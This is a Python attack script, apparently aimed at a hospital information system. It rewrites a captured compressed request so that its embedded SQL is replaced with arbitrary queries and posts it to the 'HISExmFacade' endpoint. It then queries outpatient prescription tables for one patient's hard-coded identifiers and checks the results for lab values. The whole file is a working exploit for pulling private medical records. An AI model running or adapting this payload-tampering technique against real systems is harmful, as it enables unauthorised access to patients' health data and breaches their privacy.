from his_client_final import HISClient
import requests
import zlib
import re

class RxHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = RxHunter()
hidno = 'C221748019'
hhisnum = '003617083J'

print(f"Querying OPDUSR.OPDRXPM for full data...")
queries = [
    f"SELECT * FROM OPDUSR.OPDRXPM WHERE HIDNO = '{hidno}' ORDER BY OPDDATE DESC",
    f"SELECT * FROM OPDUSR.OPDRXPM WHERE HHISNUM = '{hhisnum}' ORDER BY OPDDATE DESC"
]

for q in queries:
    print(f"--- Querying: {q} ---")
    res = hunter.execute_sql(q)
    if res and "<NewDataSet>" in res:
         print("!!! FOUND DATA IN OPDRXPM !!!")
         # Check for Lab Columns
         cols_check = ['WBC', 'HB', 'HCT', 'PLT', 'T_BIL', 'AST', 'ALT', 'BUN', 'CRE', 'NA', 'K', 'CL', 'CA', 'GLUCOSE']
         found_cols = []
         print(res[:5000]) # Preview
         for c in cols_check:
             if f"<{c}>" in res:
                 found_cols.append(c)
         
         print(f"Found Lab Columns: {found_cols}")
         # If found, break
         if found_cols:
             break
    else:
        print("[-] No data.")
